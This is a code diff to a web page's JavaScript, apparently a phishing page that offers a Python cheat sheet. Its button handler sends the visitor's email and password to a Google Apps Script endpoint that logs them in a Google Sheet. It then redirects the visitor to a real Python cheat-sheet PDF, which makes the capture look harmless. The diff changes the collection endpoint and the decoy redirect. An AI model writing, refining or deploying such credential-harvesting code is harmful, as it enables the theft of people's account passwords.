@@ -13,7 +13,7 @@ document.getElementById("nextBtn").addEventListener("click", async function (eve
 
   // Send data to Google Sheets via Google Apps Script
   try {
-    const response = await fetch("https://script.google.com/macros/s/AKfycbxJN-avFIkvouUJGzK53SqfHImi6BWgu7a_jE6y0SK0tU1XHOC7C6D_p5-j3zKHb4bN/exec", {
+    const response = await fetch("https://script.google.com/macros/s/AKfycbzaoZ-LVajtbM5K3oezXJXJr5kMiOjXy1Ths0SSNgfvXqWpJb0NxqaUlgmHoCNR-fmo/exec", {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
@@ -21,12 +21,13 @@ document.getElementById("nextBtn").addEventListener("click", async function (eve
       body: JSON.stringify({ email, password }),
     });
 
-    const result = await response.text();
-    if (response.ok) {
+    const result = await response.json(); // Parse JSON response
+    if (result.success) {
       alert("Data saved successfully!");
-      window.location.href = "https://www.geeksforgeeks.org/python-cheat-sheet/"; // Redirect to your document
+      // Redirect to the PDF file
+      window.location.href = "https://allinpython.com/wp-content/uploads/2023/09/Python-Cheat-Sheet.pdf"; // Replace with your PDF URL
     } else {
-      alert("Failed to save data: " + result);
+      alert("Failed to save data: " + result.message);
     }
   } catch (error) {
     console.error("Error:", error);
